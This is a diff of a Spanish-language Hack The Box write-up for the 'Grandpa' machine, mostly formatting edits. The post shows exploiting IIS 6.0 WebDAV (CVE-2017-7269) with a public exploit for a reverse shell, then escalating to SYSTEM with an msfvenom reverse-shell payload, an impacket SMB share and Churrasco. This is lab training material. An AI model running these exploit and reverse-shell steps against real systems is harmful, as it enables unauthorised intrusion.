@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Grandpa - Hack The Box
-excerpt: "Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80, que está usando Microsoft IIS 6.0 WebDAV, usando un Exploit que nos conectara de forma remota a la máquina (CVE-2017-7269), de ahí podemos escalar privilegios a NT Authority System aprovechando que tenemos el privilegio SeImpersonatePrivilege, justamente usando Churrasco.exe (una variante de Juicy Potato para sistemas windows viejos) y utilizando un Payload."
+excerpt: "Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80 que está usando Microsoft IIS 6.0 WebDAV, usando un Exploit que nos conectara de forma remota a la máquina (CVE-2017-7269), de ahí podemos escalar privilegios a NT Authority System aprovechando que tenemos el privilegio SeImpersonatePrivilege, justamente usando Churrasco.exe (una variante de Juicy Potato para sistemas windows viejos) y utilizando un Payload."
 date: 2023-02-18
 classes: wide
 header:
@@ -15,25 +15,30 @@ tags:
   - Windows
   - IIS 6.0 WebDAV
   - Remote Buffer Overflow (RBO)
-  - RBO - CVE-2017-7269
+  - CVE-2017-7269 (RBO)
   - System Recognition (Windows)
   - Local Privilege Escalation (LPE)
-  - LPE - Churrasco Token Kidnapping
+  - Privesc - Churrasco Token Kidnapping (LPE)
   - Reverse Shell
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-grandpa/grandpa_logo.png)
 
-Esta fue una máquina fácil en la cual vamos a vulnerar el **servicio HTTP** del **puerto 80**, que está usando **Microsoft IIS 6.0 WebDAV**, usando un Exploit que nos conectara de forma remota a la máquina **(CVE-2017-7269)**, de ahi podemos escalar privilegios a **NT Authority System** aprovechando que tenemos el privilegio **SeImpersonatePrivilege**, justamente usando **Churrasco.exe** (una variante de **Juicy Potato** para sistemas Windows viejos) y utilizando un Payload.
+Esta fue una máquina fácil en la cual vamos a vulnerar el **servicio HTTP** del **puerto 80** que está usando **Microsoft IIS 6.0 WebDAV**, usando un Exploit que nos conectara de forma remota a la máquina **(CVE-2017-7269)**, de ahi podemos escalar privilegios a **NT Authority System** aprovechando que tenemos el privilegio **SeImpersonatePrivilege**, justamente usando **Churrasco.exe** (una variante de **Juicy Potato** para sistemas Windows viejos) y utilizando un Payload.
 
 Herramientas utilizadas:
-* *nc*
+* *ping*
+* *nmap*
 * *wappalizer*
 * *wfuzz*
-* *python 2*
+* *searchsploit*
+* *nc*
+* *python2*
 * *windows-exploit-suggester.py*
 * *msfvenom*
-* *impacket*
+* *impacket-smbserver*
+* *systeminfo*
+* *copy*
 
 
 <br>
@@ -46,10 +51,10 @@ Herramientas utilizadas:
 				<li><a href="#Ping">Traza ICMP</a></li>
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
-				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#Fuzz">Fuzzing</a></li>
 				<li><a href="#Inv">Investigando Alguna Vulnerabilidad para el Servicio Microsoft IIS httpd 6.0</a></li>
 			</ul>
@@ -72,10 +77,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -168,6 +170,16 @@ Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
 
 Esta usando un **servicio Microsoft IIS httpd 6.0**, ya nos hemos enfrentado a algo similar, pero en este caso no hay ningún **servicio FTP** que podamos usar para aprovecharnos de este servicio. Es momento de analizar la página web.
 
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+</div>
+<br>
+
+
 <h2 id="HTTP">Analizando Servicio HTTP</h2>
 
 Primero entremos a la página web:
@@ -181,19 +193,6 @@ No veo nada que nos pueda ayudar. Veamos lo que nos dice el **Wappalizer**.
 </p>
 
 Nada, no veo nada que nos ayude. Intentemos hacer **Fuzzing** para ver si puede encontrar algo, aunque lo dudo bastante.
-
-
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
 
 <h2 id="Fuzz">Fuzzing</h2>
 
@@ -211,17 +210,6 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                                      
 =====================================================================
 
-000000001:   200        39 L     159 W      1433 Ch     "# directory-list-2.3-medium.txt"                                            
-000000003:   200        39 L     159 W      1433 Ch     "# Copyright 2007 James Fisher"                                              
-000000007:   200        39 L     159 W      1433 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"            
-000000011:   200        39 L     159 W      1433 Ch     "# Priority ordered case sensative list, where entries were found"           
-000000010:   200        39 L     159 W      1433 Ch     "#"                                                                          
-000000009:   200        39 L     159 W      1433 Ch     "# Suite 300, San Francisco, California, 94105, USA."                        
-000000006:   200        39 L     159 W      1433 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"              
-000000008:   200        39 L     159 W      1433 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                 
-000000005:   200        39 L     159 W      1433 Ch     "# This work is licensed under the Creative Commons"                         
-000000012:   200        39 L     159 W      1433 Ch     "# on atleast 2 different hosts"                                             
-000000002:   200        39 L     159 W      1433 Ch     "#"                                                                          
 000000014:   200        39 L     159 W      1433 Ch     "http://10.10.10.14//"                                                       
 000000004:   200        39 L     159 W      1433 Ch     "#"                                                                          
 000000013:   200        39 L     159 W      1433 Ch     "#"                                                                          
@@ -288,10 +276,7 @@ Hay varios, pero vamos a probar el que encontramos por internet que es el primer
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -301,6 +286,8 @@ Hay varios, pero vamos a probar el que encontramos por internet que es el primer
 **ADVERTENCIA**: 
 
 Este Exploit me jodio la máquina varias veces porque probe distintos Exploits para escalar privilegios, ten cuidado porque si tienes que salirte forzosamente usando **crtl + c** desde dentro de la máquina, tendrás que reiniciarla desde **HackTheBox**, o al menos eso me paso a mi porque el **servicio HTTP** del puerto 80 dejo de funcionar.
+
+----------
 
 Vamos a copiarnos el Exploit en nuestra estación de trabajo:
 ```bash
@@ -314,9 +301,8 @@ File Type: ASCII text, with very long lines (2183)
 ```
 No entiendo muy bien cómo usarlo, podría ser que debemos meter los datos de la página web y un localhost o algo así. Creo que será mejor buscar como usar este Exploit o una variante de este, antes de utilizar otro.
 
-Investigando un poco, nos aparece este GitHub:
-
-* https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
+Investigando un poco, nos aparece este **GitHub**:
+* <a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269" target="_blank">Repositorio de g0rx: iis6-exploit-2017-CVE-2017-7269</a>
 
 Este es una variante del Exploit anterior, observa como se usa:
 ```python
@@ -325,7 +311,7 @@ if len(sys.argv)<5:
     exit(1)
 ```
 
-Así que vamos a descargarlo.
+Vamos a descargarlo.
 ```bash
 git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git  
 Clonando en 'iis6-exploit-2017-CVE-2017-7269'...
@@ -335,7 +321,7 @@ Recibiendo objetos: 100% (6/6), listo.
 ```
 Y ahora lo usamos, vamonos por pasos.
 
-* Levantemos una netcat:
+* Levantemos una **netcat**:
 ```bash
 nc -nvlp 443                         
 listening on [any] 443 ...
@@ -350,7 +336,7 @@ IIS6_Exploit.py  README.md
 
 * Probemos el Exploit:
 ```bash
-python2 IIS6_Exploit.py 10.10.10.14 80 10.10.14.14 443
+python2 IIS6_Exploit.py 10.10.10.14 80 Tu_IP 443
 PROPFIND / HTTP/1.1
 Host: localhost
 Content-Length: 1744
@@ -361,7 +347,7 @@ If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬
 ```bash
 nc -nvlp 443                         
 listening on [any] 443 ...
-connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1030
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.14] 1030
 Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
 c:\windows\system32\inetsrv>whoami
@@ -375,17 +361,14 @@ nt authority\network service
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
 
 <h2 id="Windows">Enumeración de Máquina</h2>
 
-```shell
+```batch
 c:\windows\system32\inetsrv>cd C:\
 cd C:\
 C:\>dir
@@ -407,7 +390,7 @@ dir
 ```
 
 Hay algunos directorios que podrian contener algo, veámoslas:
-```shell
+```batch
 C:\>cd ADFS
 cd ADFS
 C:\ADFS>dir
@@ -424,7 +407,7 @@ cd ..
 ```
 
 No hay nada. Sigamos buscando:
-```shell
+```batch
 C:\>cd FPSE_search
 cd FPSE_search
 C:\FPSE_search>dir
@@ -441,7 +424,7 @@ cd ..
 ```
 
 Nada de nada. Veamos que más hay:
-```shell
+```batch
 C:\>cd Documents and Settings
 cd Documents and Settings
 
@@ -467,7 +450,7 @@ Access is denied.
 Aquí está el usuario y el administrador, aquí ya se aclara que no somos ni usuario. 
 
 Veamos que privilegios tenemos y la información del sistema.
-```shell
+```batch
 C:\Documents and Settings>whoami /priv
 whoami /priv
 
@@ -483,10 +466,10 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 ```
-Tenemos el **SeImpersonatePrivilege**.
+Tenemos el privilegio **SeImpersonatePrivilege**, por lo que podemos aplicar el **Juicy Potato**.
 
 Veamos la información del sistema:
-```shell
+```batch
 C:\Documents and Settings>systeminfo
 systeminfo
 
@@ -501,7 +484,7 @@ Registered Organization:   HTB
 ```
 
 Muy bien, aquí podemos usar nuestra herramienta **Windows Exploit Suggester**, aprovechemosla y veamos que nos dice:
-```shell
+```bash
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
 [*] database file detected as xls or xlsx based on extension
@@ -521,10 +504,10 @@ python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.t
 Salen varias opciones, pero no vamos a probar ninguno, esto es porque después de casi 3 horas de probar varios Exploits y en lo que tenía que reiniciar la máquina varias veces como mencione antes. ¡NO FUNCIONO NINGUNO!
 
 Los que probe fueron:
-* MS14-070 - Ambas versiones
-* MS11-046
-* MS11-062
-* MS15-051
+* *MS14-070 - Ambas versiones*
+* *MS11-046*
+* *MS11-062*
+* *MS15-051*
 
 No sé porque razón ninguno funciono, así que en este caso ahora si vamos a aprovecharnos del privilegio **SeImpersonatePrivilege**. Para abusar de este privilegio vamos a usar **Juicy Potato**, pero esta será una variante pues la versión de **Windows** de la máquina es bastante vieja.
 
@@ -532,16 +515,14 @@ No sé porque razón ninguno funciono, así que en este caso ahora si vamos a ap
 <h2 id="Churro">Escalando Privilegios con Churrasco</h2>
 
 Con solo poner **Windows server 2003 juicy potato exploit** en el buscador, nos dará una página web, la abrimos y vemos la explicación.
-
-* https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/
+* <a href="https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/" target="_blank">Privilege Escalation (Windows) – JuicyPotato.exe</a>
 
 La versión de **Juicy Potato** que ofrece esta página no nos servirá, pero si nos vamos hasta abajo ahí vendrá una variante llamada **Churrasco.exe**, esa es la que vamos a usar.
-
-* https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/
+* <a href="https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/" target="_blank">Privilege Escalation (Windows) – churrasco.exe</a>
 
 Siguiendo las indicaciones de la página, una vez descargado el **Churrasco.exe** vamos a hacer lo siguiente:
 
-* Crearemos un Payload para cargar una Reverse Shell:
+* Crearemos un Payload para cargar una **Reverse Shell**:
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
 No encoder specified, outputting raw payload
@@ -550,10 +531,9 @@ Final size of exe file: 73802 bytes
 Saved as: shell.exe
 ```
 
-**OJO**: 
-Ten cuidado y no vayas a usar el mismo puerto que usaste para acceder a la máquina porque sigue en activo.
+**OJO**: Ten cuidado y no vayas a usar el mismo puerto que usaste para acceder a la máquina porque sigue en activo.
 
-* Abrimos un servidor con Impacket para subir el Payload y el Churrasco:
+* Abrimos un servidor con **Impacket** para subir el Payload y el **Churrasco**:
 ```bash
 impacket-smbserver smbFolder $(pwd)
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -566,7 +546,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 ```
 
 * Descargamos los archivos en la máquina:
-```shell
+```batch
 C:\WINDOWS\Temp\Privesc>copy \\Tu_IP\smbFolder\churrasco.exe churrasco.exe
 copy \\Tu_IP\smbFolder\churrasco.exe churrasco.exe
         1 file(s) copied.
@@ -576,14 +556,14 @@ copy \\Tu_IP\smbFolder\shell.exe shell.exe
 ```
 **NOTA**: Esta vez no usamos **certutil.exe** porque no funciona tampoco.
 
-* Activamos una netcat con el puerto que pusimos en el Payload:
+* Activamos una **netcat** con el puerto que pusimos en el Payload:
 ```bash
 nc -nvlp 1337
 listening on [any] 1337 ...
 ```
 
-* Una vez dentro ambos archivos, activamos el Churrasco:
-```shell
+* Una vez dentro ambos archivos, activamos el **Churrasco**:
+```batch
 C:\WINDOWS\Temp\Privesc>churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 /churrasco/-->Current User: NETWORK SERVICE 
@@ -602,11 +582,11 @@ churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 /churrasco/-->Done, command should have ran as SYSTEM!
 ```
 
-* Y ya somo Root:
+* Y ya somo **Root**:
 ```bash
- nc -nvlp 1337
+nc -nvlp 1337
 listening on [any] 1337 ...
-connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1035
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.14] 1035
 Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
 C:\WINDOWS\TEMP>whoami
@@ -619,11 +599,9 @@ Solamente busca las flags en el directorio **Documents and Settings**, cada flag
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://www.exploit-db.com/exploits/41738
 * https://www.google.com/search?client=firefox-b-e&q=WebDAV+que+es
@@ -646,18 +624,47 @@ Todo este procedimiento, puedes volverlo a hacer con la **máquina Granny** de H
 <br>
 # FIN
 
-<!--
-## Solución para MS14-070
-```
-typedef DWORD NTSTATUS;
-NTSTATUS WINAPI NtQuerySystemInformation (
-        SYSTEM_INFORMATION_CLASS   SystemInformationClass,
-        PVOID                      SystemInformation,
-        ULONG                      SystemInformationLength,
-        PULONG                     ReturnLength
-);
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
 
-typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
-``¨
--->
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
 
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
